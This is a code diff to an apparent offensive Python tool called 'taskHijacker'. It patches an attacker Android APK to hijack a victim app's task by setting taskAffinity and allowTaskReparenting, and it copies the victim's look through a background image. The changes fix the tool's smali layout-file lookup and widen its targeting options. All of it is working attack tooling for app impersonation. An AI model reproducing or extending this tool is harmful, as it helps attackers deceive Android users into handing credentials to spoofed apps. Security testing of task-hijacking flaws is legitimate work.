@@ -154,7 +154,6 @@ def sign_apk(input_apk, verbose):
             line = input(">>> Enter your keystore fullpath: ")
             lines.append(line)
             count += 1
-
     if not lines[0]:
         print("[-] Error, in order to sign the APK you should enter a keystore fullpath during the signing procedue")
         exit(1)
@@ -360,6 +359,7 @@ def change_bg(apk_dir, image_dir, image, evil_activity=None, verbose=False):
                         layout_id = m_obj.group(1)
                         if verbose:
                             print("[D] Found the identifier for the '" + activity_name + "' activity layout on " + layout_id)
+                        break
             # Setting max search limit to 30 smali classes
             for smali_count in range(31):
                 if smali_count == 0:
@@ -369,12 +369,12 @@ def change_bg(apk_dir, image_dir, image, evil_activity=None, verbose=False):
                 # Starting the search for the smali file containing the list of layout filenames
                 smali_layout_file = apk_dir + smali_path + smali_package + "/R$layout.smali"
                 if verbose:
-                    print("[D] Trying with layout file '" + smali_filename + "'...")
-                if os.path.isfile(smali_filename):
+                    print("[D] Trying with layout file '" + smali_layout_file + "'...")
+                if os.path.isfile(smali_layout_file):
                     try:
-                        smali_content = read_file(smali_filename)
+                        smali_content = read_file(smali_layout_file)
                     except IOError:
-                        print("[!] Not found the layout file '" + smali_filename + "', continuing the search..")
+                        print("[!] Not found the layout file '" + smali_layout_file + "', continuing the search..")
                         continue
                     # Retrieving the name of the searched layout file
                     m_obj = re.search("static final ([\\w]+):[\\w]*?\\s]?\\=[\\s]?"+layout_id, smali_content, re.DOTALL)
@@ -382,6 +382,7 @@ def change_bg(apk_dir, image_dir, image, evil_activity=None, verbose=False):
                         layout_file = m_obj.group(1)+".xml"
                         if verbose:
                             print("[D] Found the layout filename for the '" + activity_name + "' activity on " + layout_file)
+                        break
             # Starting to change the app background
             if layout_file:
                 # Search for the specific activity layout files recursively into layout folder
@@ -415,8 +416,8 @@ def change_bg(apk_dir, image_dir, image, evil_activity=None, verbose=False):
 def main():
     # Handle the user input
     parser = argparse.ArgumentParser(prog="taskHijacker", epilog="Additional note: a keystore is needed in order to re-sign the patched attacker APK")
-    parser.add_argument("-m", "--misconfig_task", metavar="PACKAGE_NAME", help="Specify the package-name of the victim APK to exploit victim APK task misconfigurations. It modifies only the the 'taskAffinity' flag into the attacker APK")
-    parser.add_argument("-c", "--cuckoo_task", metavar="PACKAGE_NAME", help="Specify the package-name of the victim APK to exploit an unsafe Android OS feature. It modifies both the 'taskAffinity' and 'allowTaskReparenting' flags into the attacker APK")
+    parser.add_argument("-m", "--misconfig_task", metavar="PACKAGE_NAME", help="Specify the package-name (or the target custom taskAffinity) of the victim APK to exploit victim APK task misconfigurations. It modifies only the the 'taskAffinity' flag into the attacker APK")
+    parser.add_argument("-c", "--cuckoo_task", metavar="PACKAGE_NAME", help="Specify the package-name (or the target custom taskAffinity) of the victim APK to exploit an unsafe Android OS feature. It modifies both the 'taskAffinity' and 'allowTaskReparenting' flags into the attacker APK")
     parser.add_argument("-e", "--evil_activity", help="Specify the activity-name of the attacker APK used to perform the Task Hijacking attack (default is the main activity)")
     parser.add_argument("-i", "--img_bg", help="Specify the fullpath of the image file to set as background on the attacker APK")
     parser.add_argument("-d", "--dir_bg", help="Specify the location where put the background image into the attacker APK. It should be a relative path within 'res/' folder (default is 'res/drawable/')", default="res/drawable/")
